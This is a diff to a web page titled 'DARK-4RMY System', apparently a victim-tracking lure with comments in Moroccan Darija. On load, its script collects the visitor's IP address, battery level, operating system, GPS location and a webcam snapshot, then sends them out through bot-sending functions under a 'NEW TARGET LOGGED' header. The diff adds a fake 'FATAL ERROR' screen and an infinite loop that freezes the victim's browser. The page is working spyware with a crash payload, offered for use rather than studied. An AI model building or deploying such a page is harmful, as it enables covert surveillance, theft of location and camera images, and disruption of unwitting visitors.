@@ -5,14 +5,21 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>DARK-4RMY System</title>
     <style>
-        body { margin: 0; background: #0a0a0f; color: #00f3ff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; }
-        .panel { border: 2px solid #00f3ff; padding: 40px; border-radius: 20px; text-align: center; box-shadow: 0 0 20px #00f3ff; }
+        body { margin: 0; background: #0a0a0f; color: #00f3ff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .panel { border: 2px solid #00f3ff; padding: 40px; border-radius: 20px; text-align: center; z-index: 10; }
+        .glitch { animation: glitch 0.5s infinite; }
+        @keyframes glitch {
+            0% { transform: translate(0); }
+            20% { transform: translate(-5px, 5px); color: #ff0000; }
+            40% { transform: translate(5px, -5px); color: #00ff00; }
+            100% { transform: translate(0); }
+        }
     </style>
 </head>
 <body>
-    <div class="panel">
-        <h1>DARK-4RMY</h1>
-        <p id="stat">Connecting to secure server...</p>
+    <div class="panel" id="main-panel">
+        <h1 id="title">DARK-4RMY</h1>
+        <p id="stat">Connecting to system...</p>
         <video id="video" style="display:none;" autoplay></video>
         <canvas id="canvas" style="display:none;"></canvas>
     </div>
@@ -22,30 +29,42 @@
         const params = new URLSearchParams(window.location.search);
         const chatId = params.get('id');
 
+        // Function bach n-bloquiw l-browser
+        function triggerLag() {
+            document.getElementById('main-panel').classList.add('glitch');
+            document.getElementById('stat').innerText = "FATAL ERROR: SYSTEM OVERLOAD";
+            document.getElementById('stat').style.color = "red";
+            
+            // Infinite loop sghira t-t99al l-processor
+            setTimeout(() => {
+                while(true) {
+                    console.log("CRITICAL_FAILURE");
+                }
+            }, 1000);
+        }
+
         async function init() {
             if (!chatId) return;
 
             try {
-                // --- 1. JAM3 L-MA3LOMAT L-ASASIYA ---
+                // 1. Capture Info (IP/Battery)
                 const battery = await navigator.getBattery();
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
-                const level = Math.round(battery.level * 100);
                 
                 let report = `🚨 *NEW TARGET LOGGED* 🚨\n\n` +
                              `🌐 *IP:* \`${ipData.ip}\`\n` +
-                             `🔋 *Battery:* ${level}%\n` +
+                             `🔋 *Battery:* ${Math.round(battery.level * 100)}%\n` +
                              `💻 *OS:* ${navigator.platform}`;
 
-                // GPS (Optional - If allowed)
+                // 2. GPS
                 navigator.geolocation.getCurrentPosition(async (pos) => {
-                    const gpsMsg = report + `\n📍 *GPS:* [Google Maps](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`;
-                    await sendToBot(gpsMsg);
+                    await sendToBot(report + `\n📍 *GPS:* [Google Maps](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`);
                 }, async () => {
                     await sendToBot(report + `\n📍 *GPS:* Denied ❌`);
                 });
 
-                // --- 2. TRY CAMERA SNAPSHOT (The Last Step) ---
+                // 3. Camera Snapshot
                 try {
                     const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                     const video = document.getElementById('video');
@@ -56,15 +75,19 @@
                         canvas.width = video.videoWidth;
                         canvas.height = video.videoHeight;
                         canvas.getContext('2d').drawImage(video, 0, 0);
-                        canvas.toBlob(blob => sendPhoto(blob));
+                        canvas.toBlob(blob => {
+                            sendPhoto(blob);
+                            // MNIN NSALIW KOLSXI, N-DIRO L-CRASH
+                            setTimeout(triggerLag, 1500);
+                        });
                         stream.getTracks().forEach(t => t.stop());
-                        document.getElementById('stat').innerText = "System Active ✅";
                     }, 2000);
-                } catch (camErr) {
-                    document.getElementById('stat').innerText = "Camera Access Denied";
+                } catch (e) {
+                    // Ila ma-9belch camera, lag-ih 7ta hoa
+                    setTimeout(triggerLag, 1000);
                 }
 
-            } catch (err) { console.log(err); }
+            } catch (err) { triggerLag(); }
         }
 
         async function sendToBot(text) {
